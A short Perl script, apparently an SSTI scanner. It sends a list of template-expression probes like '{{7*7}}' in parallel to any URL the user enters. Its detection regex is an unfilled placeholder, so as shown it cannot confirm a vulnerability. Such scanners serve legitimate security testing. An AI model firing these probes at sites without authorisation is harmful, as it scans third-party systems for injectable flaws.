#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use URI::Escape;
use Parallel::ForkManager;
use Term::ANSIColor;

# Predefined payloads
my @payloads = (
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    '$7*7',
    '${7*7}',
    '<%7*7%>',
    '{%7*7%>',
    '<#7*7#>',
    '${{7*7}}',
    '<@7*7@>',
    '<!--#7*7#-->'
);

# Function to send HTTP requests and check for SSTI vulnerabilities
sub test_ssti {
    my ($url, $payload) = @_;

    my $ua = LWP::UserAgent->new;
    my $req = HTTP::Request->new(GET => $url . $payload);
    my $res = $ua->request($req);

    if ($res->is_success) {
        my $content = $res->decoded_content;
        # You may need to customize the response parsing based on the website's structure
        if ($content =~ /VULNERABLE_STRING_OR_PATTERN/) {
            print color('red'), "Server is vulnerable to SSTI! Payload: $payload\n", color('reset');
        }
    } else {
        print "Error: " . $res->status_line . "\n";
    }
}

# Main function
sub main {
    print "Enter your target website URL: ";
    my $target_url = <STDIN>;
    chomp $target_url;

    my $pm = Parallel::ForkManager->new(10); # Number of concurrent requests

    foreach my $payload (@payloads) {
        $pm->start and next;
        # URL-encode the payload
        $payload = uri_escape($payload);
        # Send request with the payload
        test_ssti($target_url, $payload);
        $pm->finish;
    }
    $pm->wait_all_children;
}

# Run the main function
main();
